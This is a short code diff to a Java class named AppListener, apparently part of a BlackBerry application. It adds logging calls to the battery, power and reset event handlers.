@@ -36,6 +36,7 @@ import blackberry.interfaces.CallListObserver;
 import blackberry.interfaces.Observer;
 import blackberry.interfaces.PhoneCallObserver;
 import blackberry.interfaces.Singleton;
+import blackberry.log.Log;
 import blackberry.utils.Check;
 
 // TODO: Auto-generated Javadoc
@@ -206,6 +207,8 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         //#ifdef DEBUG_INFO
         debug.info("batteryGood");
         //#endif
+        
+        Log.info("BatteryGood", DebugLevel.INFORMATION);
     }
 
     /*
@@ -216,6 +219,8 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         //#ifdef DEBUG_INFO
         debug.info("batteryLow");
         //#endif
+        
+        Log.info("BatteryLow", DebugLevel.INFORMATION);
     }
 
     /*
@@ -382,6 +387,7 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
      * @see net.rim.device.api.system.SystemListener#powerOff()
      */
     public void powerOff() {
+        Log.info("PowerOff", DebugLevel.INFORMATION);
         //#ifdef DEBUG_INFO
         debug.info("powerOff");
         //#endif
@@ -392,6 +398,7 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
      * @see net.rim.device.api.system.SystemListener#powerUp()
      */
     public void powerUp() {
+        Log.info("PowerUp", DebugLevel.INFORMATION);
         //#ifdef DEBUG_INFO
         debug.info("powerUp");
         //#endif
@@ -787,6 +794,7 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
     }
 
     public void reset() {
+        Log.info("Reset", DebugLevel.INFORMATION);
         // TODO Auto-generated method stub
     }
 
